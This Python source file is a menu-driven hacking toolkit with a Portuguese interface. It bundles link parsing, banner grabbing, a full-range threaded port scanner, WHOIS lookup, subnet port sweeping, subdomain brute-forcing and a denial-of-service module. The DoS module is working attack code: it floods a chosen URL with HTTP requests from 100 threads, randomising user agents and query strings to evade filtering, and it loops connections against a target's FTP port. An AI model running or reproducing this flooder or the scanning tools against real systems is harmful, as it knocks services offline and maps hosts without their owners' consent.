from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import random
import re
import string
import threading
import requests
import socket
import time
import signal
import dns.resolver

from urllib.parse import urlparse
from bs4 import BeautifulSoup

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
NC = '\033[0m' 
BLUE = '\033[0;34m'
CYAN = '\033[0;36m'
PURPLE = '\033[0;35m'


def traco():
    print("-" * 15)

def logo():
    print(RED + "▒█████   ▄▄▄▄    ██▓     ██▓ ██▒   █▓ ██▓ ▒█████   ███▄    █      ██████ ▓█████  ▄████▄  ")
    print("▒██▒  ██▒▓█████▄ ▓██▒    ▓██▒▓██░   █▒▓██▒▒██▒  ██▒ ██ ▀█   █    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ")
    print("▒██░  ██▒▒██▒ ▄██▒██░    ▒██▒ ▓██  █▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒   ░ ▓██▄   ▒███   ▒▓█    ▄ ")
    print("▒██   ██░▒██░█▀  ▒██░    ░██░  ▒██ █░░░██░▒██   ██░▓██▒  ▐▌██▒     ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒")
    print("░ ████▓▒░░▓█  ▀█▓░██████▒░██░   ▒▀█░  ░██░░ ████▓▒░▒██░   ▓██░   ▒██████▒▒░▒████▒▒ ▓███▀ ░")
    print("░ ▒░▒░▒░ ░▒▓███▀▒░ ▒░▓  ░░▓     ░ ▐░  ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░")
    print("  ░ ▒ ▒░ ▒░▒   ░ ░ ░ ▒  ░ ▒ ░   ░ ░░   ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░   ░ ░▒  ░ ░ ░ ░  ░  ░  ▒   ")
    print("░ ░ ░ ▒   ░    ░   ░ ░    ▒ ░     ░░   ▒ ░░ ░ ░ ▒     ░   ░ ░    ░  ░  ░     ░   ░        ")
    print("░ ░ ░ ▒   ░    ░   ░ ░    ▒ ░     ░   ▒ ░░ ░ ░ ▒     ░   ░ ░    ░  ░  ░     ░   ░        ")
    print("    ░ ░   ░          ░  ░ ░        ░   ░      ░ ░           ░          ░     ░  ░░ ░      ")
    print("               ░                  ░                                              ░         " + NC)

    frame_top = f"{YELLOW}==========================================================================================={NC}"
    frame_bottom = f"{YELLOW}==========================================================================================={NC}"


    print(frame_top)
    print(f"{PURPLE}                            [+] Coded by: R4nyM0n3y {NC}")
    print(f"{PURPLE}                         https://github.com/AndreNunes7 {NC}")
    print(frame_bottom)

def menu():
    print(f"{GREEN}[+]{NC} {YELLOW}Select an option: {NC}\n \n"
          f"{PURPLE}[1]{NC} - {YELLOW}Parsing HTML {NC}\n"
          f"{PURPLE}[2]{NC} - {YELLOW}Banner Grabbing {NC}\n"
          f"{PURPLE}[3]{NC} - {YELLOW}DoS {NC}\n"
          f"{PURPLE}[4] {NC}- {YELLOW}Port Scanning {NC}\n"
          f"{PURPLE}[5] {NC}- {YELLOW}Whois {NC}\n"
          f"{PURPLE}[6] {NC}- {YELLOW}Port Knocking {NC}\n"
          f"{PURPLE}[7] {NC}- {YELLOW}Dns Scan {NC}\n"
          f"{PURPLE}[8] {NC}- {YELLOW}Exit {NC}\n"
          
          )

def validate_option():
    while True:
        resp = input(f"{GREEN}>>>>> {NC}")
        if resp.isdigit() and resp in ["1", "2", "3", "4", "5", "6", "7", "8"]:
            return resp
        else:
            print(f"{RED}[-] Opção inválida!{NC}: Selecione um entre {PURPLE}1 a 4{NC} e digite apenas {PURPLE}números{NC}!")
            



def logo_parsing():
    print(RED + "██████████                               ███                         █████   █████  █████                    ████ ")
    print("░░███░░░░░███                             ░░░                         ░░███   ░░███  ░░███                    ░░███ ")
    print(" ░███    ░███  ██████   ████████   █████  ████  ████████    ███████    ░███    ░███  ███████   █████████████   ░███ ")
    print(" ░██████████  ░░░░░███ ░░███░░███ ███░░  ░░███ ░░███░░███  ███░░███    ░███████████ ░░░███░   ░░███░░███░░███  ░███ ")
    print(" ░███░░░░░░    ███████  ░███ ░░░ ░░█████  ░███  ░███ ░███ ░███ ░███    ░███░░░░░███   ░███     ░███ ░███ ░███  ░███ ")
    print(" ░███         ███░░███  ░███      ░░░░███ ░███  ░███ ░███ ░███ ░███    ░███    ░███   ░███ ███ ░███ ░███ ░███  ░███ ")
    print(" █████       ░░████████ █████     ██████  █████ ████ █████░░███████    █████   █████  ░░█████  █████░███ █████ █████")
    print("░░░░░         ░░░░░░░░ ░░░░░     ░░░░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░███   ░░░░░   ░░░░░    ░░░░░  ░░░░░ ░░░ ░░░░░ ░░░░░ ")
    print("                                                           ███ ░███                                                 ")
    print("                                                          ░░██████                                                  ")
    print("                                                           ░░░░░░                                                   " + NC)
   
def logo_grabbing():
    print(RED + "███████████                                                      █████████                                          ")
    print("░░███░░░░░███                                                    ███░░░░░███                                         ")
    print(" ░███    ░███  ██████   ████████   ████████    ██████  ████████ ░███    ░░░   ██████   ██████   ████████   ████████  ")
    print(" ░██████████  ░░░░░███ ░░███░░███ ░░███░░███  ███░░███░░███░░███░░█████████  ███░░███ ░░░░░███ ░░███░░███ ░░███░░███ ")
    print(" ░███░░░░░███  ███████  ░███ ░███  ░███ ░███ ░███████  ░███ ░░░  ░░░░░░░░███░███ ░░░   ███████  ░███ ░███  ░███ ░███ ")
    print(" ░███    ░███ ███░░███  ░███ ░███  ░███ ░███ ░███░░░   ░███      ███    ░███░███  ███ ███░░███  ░███ ░███  ░███ ░███ ")
    print(" ███████████ ░░████████ ████ █████ ████ █████░░██████  █████    ░░█████████ ░░██████ ░░████████ ████ █████ ████ █████")
    print("░░░░░░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░      ░░░░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░ ")
    print("                                                                                                                     ")
    print("                                                                                                                     ")
    print("                                                                                                                     " + NC)
    
def logo_DoS():
    RED = '\033[0;31m'
    NC = '\033[0m'

    print(RED + "██████████             █████████       █████████    █████     █████                       █████     ")
    print("░░███░░░░███           ███░░░░░███     ███░░░░░███  ░░███     ░░███                       ░░███      ")
    print(" ░███   ░░███  ██████ ░███    ░░░     ░███    ░███  ███████   ███████    ██████    ██████  ░███ █████")
    print(" ░███    ░███ ███░░███░░█████████     ░███████████ ░░░███░   ░░░███░    ░░░░░███  ███░░███ ░███░░███ ")
    print(" ░███    ░███░███ ░███ ░░░░░░░░███    ░███░░░░░███   ░███      ░███      ███████ ░███ ░░░  ░██████░  ")
    print(" ░███    ███ ░███ ░███ ███    ░███    ░███    ░███   ░███ ███  ░███ ███ ███░░███ ░███  ███ ░███░░███ ")
    print(" ██████████  ░░██████ ░░█████████     █████   █████  ░░█████   ░░█████ ░░████████░░██████  ████ █████")
    print("░░░░░░░░░░    ░░░░░░   ░░░░░░░░░     ░░░░░   ░░░░░    ░░░░░     ░░░░░   ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ ")
    print("                                                                                                     ")
    print("                                                                                                     ")
    print("                                                                                                     " + NC)

def logo_PortScanner():   
    print(RED + "███████████                      █████        █████████                                                             ")
    print("░░███░░░░░███                    ░░███        ███░░░░░███                                                           ")
    print(" ░███    ░███  ██████  ████████  ███████     ░███    ░░░   ██████   ██████   ████████   ████████    ██████  ████████ ")
    print(" ░██████████  ███░░███░░███░░███░░░███░      ░░█████████  ███░░███ ░░░░░███ ░░███░░███ ░░███░░███  ███░░███░░███░░███")
    print(" ░███░░░░░░  ░███ ░███ ░███ ░░░   ░███        ░░░░░░░░███░███ ░░░   ███████  ░███ ░███  ░███ ░███ ░███████  ░███ ░░░ ")
    print(" ░███        ░███ ░███ ░███       ░███ ███    ███    ░███░███  ███ ███░░███  ░███ ░███  ░███ ░███ ░███░░░   ░███     ")
    print(" █████       ░░██████  █████      ░░█████    ░░█████████ ░░██████ ░░████████ ████ █████ ████ █████░░██████  █████    ")
    print("░░░░░         ░░░░░░  ░░░░░        ░░░░░      ░░░░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░░  ░░░░░     ")
    print("                                                                                                                      ")
    print("                                                                                                                      ")
    print("                                                                                                                      " + NC)

def logo_whois():
    print(RED + " █████   ███   █████ █████                ███         ")
    print("░░███   ░███  ░░███ ░░███                ░░░          ")
    print(" ░███   ░███   ░███  ░███████    ██████  ████   █████ ")
    print(" ░███   ░███   ░███  ░███░░███  ███░░███░░███  ███░░  ")
    print(" ░░███  █████  ███   ░███ ░███ ░███ ░███ ░███ ░░█████ ")
    print("  ░░░█████░█████░    ░███ ░███ ░███ ░███ ░███  ░░░░███")
    print("    ░░███ ░░███      ████ █████░░██████  █████ ██████ ")
    print("     ░░░   ░░░      ░░░░ ░░░░░  ░░░░░░  ░░░░░ ░░░░░░  " + NC)
  
def logo_port_knocking():
    print(RED +"███████████                      █████       █████   ████                              █████       ███                     ")
    print("░░███░░░░░███                    ░░███       ░░███   ███░                              ░░███       ░░░                      ")
    print(" ░███    ░███  ██████  ████████  ███████      ░███  ███    ████████    ██████   ██████  ░███ █████ ████  ████████    ███████")
    print(" ░██████████  ███░░███░░███░░███░░░███░       ░███████    ░░███░░███  ███░░███ ███░░███ ░███░░███ ░░███ ░░███░░███  ███░░███")
    print(" ░███░░░░░░  ░███ ░███ ░███ ░░░   ░███        ░███░░███    ░███ ░███ ░███ ░███░███ ░░░  ░██████░   ░███  ░███ ░███ ░███ ░███")
    print(" ░███        ░███ ░███ ░███       ░███ ███    ░███ ░░███   ░███ ░███ ░███ ░███░███  ███ ░███░░███  ░███  ░███ ░███ ░███ ░███")
    print(" █████       ░░██████  █████      ░░█████     █████ ░░████ ████ █████░░██████ ░░██████  ████ █████ █████ ████ █████░░███████")
    print("░░░░░         ░░░░░░  ░░░░░        ░░░░░     ░░░░░   ░░░░ ░░░░ ░░░░░  ░░░░░░   ░░░░░░  ░░░░ ░░░░░ ░░░░░ ░░░░ ░░░░░  ░░░░░███")
    print("                                                                                                                    ███ ░███")
    print("                                                                                                                   ░░██████ ")
    print("                                                                                                                    ░░░░░░   " + NC)
    
def logo_dns_scan():
    print(RED + "██████████                          █████████                                 ")
    print("░░███░░░░███                        ███░░░░░███                               ")
    print(" ░███   ░░███ ████████    █████    ░███    ░░░   ██████   ██████   ████████  ")
    print(" ░███    ░███░░███░░███  ███░░     ░░█████████  ███░░███ ░░░░░███ ░░███░░███ ")
    print(" ░███    ░███ ░███ ░███ ░░█████     ░░░░░░░░███░███ ░░░   ███████  ░███ ░███ ")
    print(" ░███    ███  ░███ ░███  ░░░░███    ███    ░███░███  ███ ███░░███  ░███ ░███ ")
    print(" ██████████   ████ █████ ██████    ░░█████████ ░░██████ ░░████████ ████ █████")
    print("░░░░░░░░░░   ░░░░ ░░░░░ ░░░░░░      ░░░░░░░░░   ░░░░░░   ░░░░░░░░ ░░░░ ░░░░░ ")
    print(NC)
  
      

             
     
     
              
def parsing_html():
    def format_url(user_input):
        user_input = user_input.strip()
        parsed_url = urlparse(user_input)
        
        if not parsed_url.netloc:
            user_input = f"http://{user_input}"
            parsed_url = urlparse(user_input)
        
        if not parsed_url.scheme:
            user_input = f"https://{user_input}"
        return user_input
    
    def validaURL(url):
        try:
            response = requests.head(url, allow_redirects=True, timeout=5)
            response.raise_for_status()
            return True
        except requests.RequestException:
            return False

    while True:
        print()
        url_user = input(f"{GREEN}[+]{NC} Digite uma URL: >>>> ")
        url = format_url(url_user)

        while not validaURL(url):
            print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
            url_user = input(f"{RED}[-]{NC} Digite uma URL válida: >>>> ")
            url = format_url(url_user)

        print(f"{YELLOW}{'=' * 72}{NC}")
        print(f"{GREEN}           [+] Resolvendo URLs em:{NC} {CYAN}{url}{NC}")
        print(f"{PURPLE}                  Desenvolvido by: R4nyM0n3y {NC}")
        print(f"{YELLOW}{'=' * 72}{NC}")
        
        try:
            response = requests.get(url)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Erro ao processar a URL {url}")
            continue
        
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)
        domain_set = set()

        for link in links:
            parsed_url = urlparse(link['href'])
            domain = parsed_url.netloc
            if domain:
                domain_set.add(domain)

        with open('lista_urls', 'w') as file:
            for domain in domain_set:
                file.write(f'{domain}\n')

        if not os.path.exists('lista_urls'):
            print("Arquivo 'lista_urls' não encontrado")
            return

        with open('lista_urls', 'r') as file:
            for line in file:
                domain = line.strip()
                try:
                    ip = socket.gethostbyname(domain)
                    print(f"{GREEN}[+]{NC} Host {BLUE}{domain}{NC} tem o IP: {RED}{ip}{NC}")
                    time.sleep(1)
                    result_filename = f"resultado_{re.sub(r'[:/]', '', url)}.ip"
                    
                    with open(result_filename, 'a') as result_file:
                        result_file.write(f"{ip}\n")
                except socket.gaierror:
                    print(f"{RED}[-]{NC} ERRO ao resolver domínio {RED}{domain}{NC}")
                except Exception as e:
                    print(f"Erro desconhecido: {e}")

        print(f"{YELLOW}{'=' * 72}{NC}")
        print()
        perg = input("Consultar novamente? [S/N]: ").strip().lower()
        if perg not in ("s", "sim"):
            if perg in ("n", "não"):
                print("Finalizando...")
                time.sleep(1)
                os.system("cls")
                logo()
                tools()
            else:
                print("Opção inválida!")
                continue
            break
                  
def banner_grabbing():
    def validator():
        while True:
            ip = input(f"{GREEN}[+]{NC} Digite um IP: >>>> ")
            if not ip:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                continue
            try:
                socket.inet_aton(ip)
            except socket.error:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")
                continue
            break

        while True:
            porta = input(f"{GREEN}[+]{NC} Digite uma PORTA: >>>> ")
            if not porta:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira a PORTA!!{NC}")
                continue
            if not porta.isdigit() or not (0 <= int(porta) <= 65535):
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Porta inválida!!{NC}")
                continue
            break

        return ip, porta

    while True:
        print()

        ip, porta = validator()

        print(f"{YELLOW}{'=' * 72}{NC}")
        print(f'{GREEN}[+]{NC} {PURPLE}Escaneando...{NC}')
        print(f"{YELLOW}{'=' * 72}{NC}")
        time.sleep(1)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as meusocket:
                meusocket.settimeout(5)
                meusocket.connect((ip, int(porta)))
                banner = meusocket.recv(1024)
                print(f"{GREEN}[+]{NC} Banner recebido de {BLUE}{ip}:{porta}{NC}: {CYAN}{banner.decode().strip()}{NC}")
                
                print(f"{YELLOW}{'=' * 72}{NC}")
                print()
                perg = input("Consultar novamente? [S/N]: ").strip().lower()
                if perg not in ("s", "sim"):
                    if perg in ("n", "não"):
                        time.sleep(1)
                        print("Finalizando...")
                        os.system("cls")
                        logo()
                        tools()
                    else:
                        print("Opção inválida!")
                        continue
                    break
                print(f"{YELLOW}{'=' * 72}{NC}")
                    
        except socket.error as e:
            print(f"{RED}[-]{NC} Erro ao conectar ao IP {RED}{ip}{NC} na porta {RED}{porta}{NC}")
            print(f"{YELLOW}{'=' * 72}{NC}")
            print()
            perg = input("Consultar novamente? [S/N]: ").strip().lower()
            if perg not in ("s", "sim"):
                if perg in ("n", "não"):
                    time.sleep(1)
                    print("Finalizando...")
                    os.system("cls")
                    logo()
                    tools()
                else:
                    print("Opção inválida!")
                    continue
                break
           
def dos_atack():
    
    def dos_web():
        keep_running = True
        
        def handle_sigint(sig, frame):
            nonlocal keep_running
            keep_running = False

        def format_url(user_input):
            user_input = user_input.strip()
            parsed_url = urlparse(user_input)
            
            if not parsed_url.netloc:
                user_input = f"http://{user_input}"
                parsed_url = urlparse(user_input)
            
            if not parsed_url.scheme:
                user_input = f"https://{user_input}"
            return user_input
        
        def valida_url(url):
            try:
                response = requests.head(url, allow_redirects=True, timeout=5)
                response.raise_for_status()
                return True
            except requests.RequestException:
                return False

        def validator():
            while True:
                print()
                url_user = input(f"{GREEN}[+]{NC} Digite uma URL: >>>> ")
                url = format_url(url_user)

                while not valida_url(url):
                    print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
                    url_user = input(f"{RED}[-]{NC} Digite uma URL válida: >>>> ")
                    url = format_url(url_user)

                return url

        def random_user_agent():
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
            ]
            return random.choice(user_agents)

        def random_query_string(length=10):
            letters = string.ascii_lowercase
            return ''.join(random.choice(letters) for i in range(length))

        def dos_attack_web(url):
            while keep_running:
                try:
                    headers = {
                        'User-Agent': random_user_agent()
                    }
                    params = {
                        'q': random_query_string()
                    }
                    response = requests.get(url, headers=headers, params=params)
                    print(f'{GREEN}[+]{NC} {PURPLE}Attacking send: {response.status_code} - {response.reason}{NC}')
                    time.sleep(random.uniform(0.1, 1.0)) 
                except requests.RequestException:
                    print(f"{RED}[-]{NC} Connection failed")
                    break
                except KeyboardInterrupt:
                    break

        def main():
            nonlocal keep_running
            signal.signal(signal.SIGINT, handle_sigint)
            url = validator()
            print(f"{RED}====================================================================={NC}")
            print(f'{GREEN}                       [+]{NC} {PURPLE}Attacking...{NC}')
            print(f"{RED}====================================================================={NC}")
            time.sleep(1)

            num_threads = 100

            threads = []
            for i in range(num_threads):
                t = threading.Thread(target=dos_attack_web, args=(url,))
                t.start()
                threads.append(t)
                time.sleep(0.1)

            for t in threads:
                t.join()

            print(f"{RED}[-]{NC} Exiting...")

        main()

    def dos_ftp():
        keep_running = True

        def handle_sigint(sig, frame):
            nonlocal keep_running
            keep_running = False

        def validator():
            while True:
                print()
                ip = input(f"{GREEN}[+]{NC} Digite o IP: >>>> ")
                
                if not ip:
                    print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                    continue
                try:
                    socket.inet_aton(ip)
                    return ip
                except socket.error:
                    print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")

        signal.signal(signal.SIGINT, handle_sigint)
        ip = validator()
        
        print(f"{RED}====================================================================={NC}")
        print(f'{GREEN}                       [+]{NC} {PURPLE}Attacking...{NC}')
        print(f"{RED}====================================================================={NC}")
        time.sleep(1)

        while keep_running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    s.connect((ip, 21))
                    local_addr = s.getsockname()
                    remote_addr = s.getpeername()
                    print(f'{GREEN}[+]{NC} {PURPLE}Attacking service: {local_addr[0]}:{local_addr[1]} -> {remote_addr[0]}:{remote_addr[1]}{NC}')
                    time.sleep(1)
                        
            except (socket.timeout, socket.error):
                time.sleep(1)
                print(f"{RED}[-]{NC} Connection failed")
                print(f"{RED}---------------------------------------------------------------------{NC}")
                break
            except KeyboardInterrupt:
                break
        

        print(f"{RED}[-]{NC} Exiting...")
        

    def dos_options():
        print(f"{GREEN}[+]{NC} {YELLOW}Select a service: {NC}\n\n"
              
              f"{PURPLE}[1]{NC} - {YELLOW}HTTP {NC}\n"
              f"{PURPLE}[2]{NC} - {YELLOW}FTP {NC}\n")
        print()
        while True:
            try:
                resp = input(f"{GREEN}>>>>> {NC}")
                if resp == "1":
                    dos_web()
                    break
                elif resp == "2":
                    dos_ftp()
                    break
                else:
                    print(f"{RED}[-] Opção inválida! Selecione uma entre 1 ou 2.{NC}")
            except KeyboardInterrupt:
                print(f"{RED}[-]{NC} Exiting...")
                break

    dos_options()
        
def portScanner():
    def format_url(user_input):
        user_input = user_input.strip()
        parsed_url = urlparse(user_input)
        
        if not parsed_url.netloc:
            user_input = f"http://{user_input}"
            parsed_url = urlparse(user_input)
        
        if not parsed_url.scheme:
            user_input = f"https://{user_input}"
        return user_input

    def valida_url(url):
        try:
            response = requests.head(url, allow_redirects=True, timeout=5)
            response.raise_for_status()
            return True
        except requests.RequestException:
            return False

    def validator():
        while True:
            print()
            url_user = input(f"{GREEN}[+]{NC} Digite uma URL: >>>> ")
            url = format_url(url_user)

            while not valida_url(url):
                print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
                url_user = input(f"{RED}[-]{NC} Digite uma URL válida: >>>> ")
                url = format_url(url_user)

            return url

    def scan_port(url, porta):
        try:
            meusocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            meusocket.settimeout(1)
            if meusocket.connect_ex((url, porta)) == 0:
                print(f"{GREEN}[+]{NC} Porta {RED}{porta}{NC} {GREEN}[ABERTA]{NC}")
            meusocket.close()
        except socket.error:
            print(f"{RED}[-]{NC} Erro ao escanear a porta {porta}")
        
    def port_scanner(url):
        print(f"{YELLOW}={NC}" * 65)
        print(f"{GREEN}[+]{NC} Iniciando varredura de {PURPLE}portas{NC} para {PURPLE}{url}{NC}")
        print(f"{YELLOW}={NC}" * 65)
        threads = []
        try:
            for porta in range(1, 65536):
                thread = threading.Thread(target=scan_port, args=(url, porta))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f"\n{RED}Exiting...{NC}")
            return

    url = validator()
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    port_scanner(hostname)
                      
def whois():
    def format_url(user_input):
        user_input = user_input.strip()
        parsed_url = urlparse(user_input)

        if not parsed_url.netloc:
            user_input = f"http://{user_input}"
            parsed_url = urlparse(user_input)

        if not parsed_url.scheme:
            user_input = f"https://{user_input}"
        return user_input

    def valida_url(url):
        try:
            response = requests.head(url, allow_redirects=True, timeout=5)
            response.raise_for_status()
            return True
        except requests.RequestException:
            return False

    def validator():
        while True:
            print()
            url_user = input(f"{GREEN}[+]{NC} Digite uma URL: >>>> ")
            url = format_url(url_user)

            while not valida_url(url):
                print(f"{RED}URL inválida. Por favor, digite novamente.{NC}")
                url_user = input(f"{RED}[-]{NC} Digite uma URL válida: >>>> ")
                url = format_url(url_user)

            return url

    def extract_domain(url):
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        return domain

    def whois_lookup(domain):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("whois.iana.org", 43))
                s.send((domain + "\r\n").encode('utf-8'))
                resposta = s.recv(1024).split()

            if len(resposta) > 19:
                whois_server = resposta[19].decode('utf-8')
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s1:
                    s1.connect((whois_server, 43))
                    s1.send((domain + "\r\n").encode('utf-8'))
                    resp = s1.recv(4096).decode('iso-8859-1')
                    
                    for line in resp.splitlines():
                        if not line.startswith('%'):
                            print(line)
                        if line.startswith('>>>'):
                            break

        except socket.error as e:
            print(f"Erro ao conectar ao servidor WHOIS: {e}")

    url = validator()
    domain = extract_domain(url)
    whois_lookup(domain)
    
def port_knocking():
    keep_running = True

    def handle_sigint(sig, frame):
        nonlocal keep_running
        keep_running = False
        print(f"\n{RED}[!] Execução interrompida pelo usuário.{NC}")

    def validator():
        while True:
            ip = input(f"{GREEN}[+]{NC} Digite o {PURPLE}IP{NC} ou {PURPLE}rede{NC} {PURPLE}(ex: 192.168.1):{NC} {GREEN}>>>>{NC} ")
            if not ip:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}Insira o IP!!{NC}")
                continue
            try:
                socket.inet_aton(ip)
                return ip
            except socket.error:
                print(f"{RED}[-] ERRO!!{NC} {PURPLE}IP inválido!!{NC}")

    def knock_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                return port if result == 0 else None
        except socket.error:
            return None

    signal.signal(signal.SIGINT, handle_sigint)
    ip_prefix = validator()

    
    ports = input(f"{GREEN}[+]{NC} Digite a sequência de portas (separadas por vírgulas, ex: 80,21,22,443): >>>> ")
    ports = [int(port.strip()) for port in ports.split(',')]

    print(f"{RED}====================================================================={NC}")
    print(f'{GREEN}                       [+]{NC} {PURPLE}Iniciando o Port Knocking...{NC}')
    print(f"{GREEN}                           [!]{NC} Coded by: {PURPLE}R4nyM0n3y {NC}")    
    print(f"{RED}====================================================================={NC}")
    time.sleep(1)

    successful_knocks = {}

    with ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(1, 255):
            if not keep_running:
                break
            current_ip = f"{ip_prefix}.{i}"
           
            
            
            futures = {executor.submit(knock_port, current_ip, port): port for port in ports}

            
            for future in as_completed(futures):
                if not keep_running:
                    break
                port = futures[future]
                if future.result() is not None:
                    if current_ip not in successful_knocks:
                        successful_knocks[current_ip] = set()
                    successful_knocks[current_ip].add(port)
            
            
            if current_ip in successful_knocks:
                ports_str = ', '.join(map(str, sorted(successful_knocks[current_ip])))
                print(f"{GREEN}[+] {NC}IP: {RED}{current_ip}{NC} - Portas: {GREEN}{ports_str}{NC}")

  
    if not keep_running:
        print(f"\n{RED}Execução interrompida antes de completar.{NC}")
    elif successful_knocks:
        print(f"\n{GREEN}Port Knocking bem-sucedido em:{NC}")
        for ip, ports in successful_knocks.items():
            ports_str = ', '.join(map(str, sorted(ports)))
            print(f"{GREEN}[+] {NC}IP: {RED}{ip}{NC} - Portas: {GREEN}{ports_str}{NC}")
    else:
        print(f"{RED}Nenhum port knocking bem-sucedido encontrado.{NC}")

def dns_scan():
    try:
        def validator():
            while True:
                domain = input(f"{GREEN}[+]{NC} Digite um {GREEN}domínio{NC}: {PURPLE}>>>>{NC} ").strip()
                print(f"{YELLOW}={NC}" * 53)
                if not domain:
                    print(f"{RED}[-] ERRO!!{NC} {GREEN}Insira um domínio!!{NC}")
                    continue
                # if not domain.endswith("."):
                #     domain += "."
                try:
                    socket.gethostbyname(domain)
                    return domain
                except socket.gaierror:
                    print(f"{RED}[-] ERRO!!{NC} {GREEN}Domínio inválido!!{NC}")

        def dns_lookup(domain): 
            try:
                answers = dns.resolver.resolve(domain, 'A')
                return [str(rdata) for rdata in answers]
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                return None
            except dns.name.EmptyLabel:
                print(f"{RED}[-] ERRO!!{NC} {GREEN}Nome de domínio inválido: {domain}{NC}")
                return None

        def read_wordlist(filename):
            try:
                with open(filename, 'r') as f:
                    return [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(f"{RED}[-] {NC}Arquivo {filename} não encontrado.")
                return None
            except Exception as e:
                print(f"{RED}[-] {NC}Erro ao ler o arquivo: {e}")
                return None

        domain = validator()
        wordlist = read_wordlist('common.txt')
        
        if wordlist is None:
            return

        found_subdomains = []
        for word in wordlist:
            subdomain = f"{word}.{domain}"
            if not subdomain or subdomain.startswith('.') or subdomain.endswith('.'):
                continue
            response = dns_lookup(subdomain)
            if response:
                found_subdomains.append(subdomain)
                print(f"{GREEN}[+] {NC}Sub-Domínio encontrado: {RED}{subdomain}{NC}")

        if not found_subdomains:
            print(f"{RED}[-] {NC}Nenhum sub-domínio encontrado.")
            
    except KeyboardInterrupt:
        print(f"\n{RED}Execução interrompida pelo usuário.{NC}")






def tools():
    menu()
    option = validate_option()
    if option == "1":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_parsing()
        parsing_html()
    elif option == "2":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_grabbing()
        banner_grabbing()
    elif option == "3":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_DoS()
        dos_atack()
    elif option == "4":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_PortScanner()
        portScanner()

    elif option == "5":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_whois()
        whois()
    elif option == "6":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_port_knocking()
        port_knocking()
    elif option == "7":
        os.system('cls' if os.name == 'nt' else 'clear')
        logo_dns_scan()
        dns_scan()
    elif option == "8":
        print(f"{RED}[-]{NC} Encerrando....")
        time.sleep(1)
        os.abort()
       

    




if __name__ == "__main__":
    logo()
    tools()
